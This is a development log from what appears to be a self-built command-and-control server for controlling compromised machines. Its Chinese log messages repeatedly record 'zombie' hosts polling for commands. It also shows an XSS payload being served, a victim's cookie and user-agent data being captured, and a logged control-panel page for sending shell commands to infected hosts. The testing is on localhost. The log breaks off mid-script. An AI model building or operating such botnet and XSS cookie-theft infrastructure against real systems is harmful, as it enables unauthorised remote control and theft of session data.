2025-06-25 00:18:15 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:18:15 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:18:15] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:18:16 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:18:16 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:18:16 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:18:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:18:16] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:18:17 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:18:17 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:18:17 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:18:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:18:17] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:18:18 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:18:18 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:18:18 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:18:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:18:18] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:18:19 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:18:19 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:18:19 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:18:19 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:18:19] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:18:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:18:20 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:18:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:18:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:18:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:18:21 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:18:21 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:18:21 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:18:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:18:21] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:18:22 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:18:22 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:18:22 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:18:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:18:22] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:18:23 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:18:23 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:18:23 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:18:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:18:23] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:18:24 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:18:24 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:18:24 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:18:24 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:18:24] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:18:25 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:18:25 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:18:25 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:18:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:18:25] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:18:26 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:18:26 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:18:26 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:18:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:18:26] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:18:27 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:18:27 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:18:27 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:18:27 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:18:27] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:18:28 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:18:28 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:18:28 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:18:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:18:28] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:18:29 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:18:29 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:18:29 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:18:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:18:29] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:18:30 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:18:30 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:18:30 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:18:30 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:18:30] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:18:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:18:31 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:18:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:18:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:18:31] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:18:32 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:18:32 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:18:32 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:18:32 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:18:32] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:18:33 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:18:33 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:18:33 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:18:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:18:33] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:18:34 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:18:34 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:18:34 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:18:34 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:18:34] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:19:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:19:20 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:19:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:19:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:19:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:20:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:20:20 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:20:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:20:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:20:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:21:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:21:20 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:21:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:21:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:21:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:22:14 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-25 00:22:14 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-25 00:22:14 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-25 00:22:14 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-25 00:22:14 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-25 00:22:14 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-25 00:22:14 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-25 00:22:14 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-25 00:22:14 | INFO     | start_flaresolverr.py:59 | start_flaresolverr() | FlareSolverr 已經在運行
2025-06-25 00:22:14 | INFO     | app.py:234 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-25 00:22:14 | INFO     | app.py:234 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-25 00:22:14 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8965
2025-06-25 00:22:14 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-25 00:22:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:22:17] "GET /health HTTP/1.1" 200 -
2025-06-25 00:22:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:22:17] "OPTIONS /api/control/add_message HTTP/1.1" 200 -
2025-06-25 00:22:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:22:20 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:22:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:22:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:22:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:22:50 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-25 00:22:50 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-25 00:22:50 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-25 00:22:50 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-25 00:22:50 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-25 00:22:50 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-25 00:22:50 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-25 00:22:50 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-25 00:22:50 | INFO     | start_flaresolverr.py:59 | start_flaresolverr() | FlareSolverr 已經在運行
2025-06-25 00:22:50 | INFO     | app.py:234 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-25 00:22:50 | INFO     | app.py:234 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-25 00:22:50 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-25 00:22:50 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-25 00:22:55 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-25 00:22:55 | INFO     | control_route.py:48 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-25 00:22:55 | ERROR    | control_route.py:87 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command) VALUES (?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', 'test', None, '2025-06-25 00:22:55.824962', None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-25 00:22:55 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0240s) -> 回傳: <function add_cors_headers.<locals>.decorated_function at 0x77f284b24f40>
2025-06-25 00:22:55 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:22:55] "[35m[1mGET /api/control/add_message?message=test&target_ip=127.0.0.1 HTTP/1.1[0m" 500 -
2025-06-25 00:23:03 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:23:03 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:23:03 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0030s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:23:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:23:03] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:23:04 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:23:04 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:23:04 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0016s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:23:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:23:04] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:23:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-25 00:23:05 | INFO     | control_route.py:155 | xss_payload() | 用戶請求XSS載荷文件
2025-06-25 00:23:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0002s) -> 回傳: <Response 2102 bytes [200 OK]>
2025-06-25 00:23:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:23:05] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-25 00:23:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-25 00:23:05 | INFO     | control_route.py:43 | add_message() | 用戶請求添加消息 (POST)
2025-06-25 00:23:05 | ERROR    | control_route.py:87 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command) VALUES (?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '{"where":"http://127.0.0.1:8000/","target_ip":"127.0.0.1","cookie":"","user_agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36","time_stamp":"2025-06-24T16:23:05.378Z"}', None, '2025-06-25 00:23:05.384548', None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-25 00:23:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0026s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-25 00:23:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:23:05] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-25 00:23:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-25 00:23:05 | INFO     | control_route.py:101 | get_messages() | 用戶請求獲取消息
2025-06-25 00:23:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0125s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> {&#34;where&#34;:&#34;http://127.0.0.1:8000/&#34;,&#34;target_ip&#34;:&#34;127.0.0.1&#34;,&#34;cookie&#34;:&#34;&#34;,&#34;user_agent&#34;:&#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36&#34;,&#34;time_stamp&#34;:&#34;2025-06-24T16:15:51.595Z&#34;}</p>\n            <p><strong>建立時間:</strong> 2025-06-25 00:15:51.600109</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () 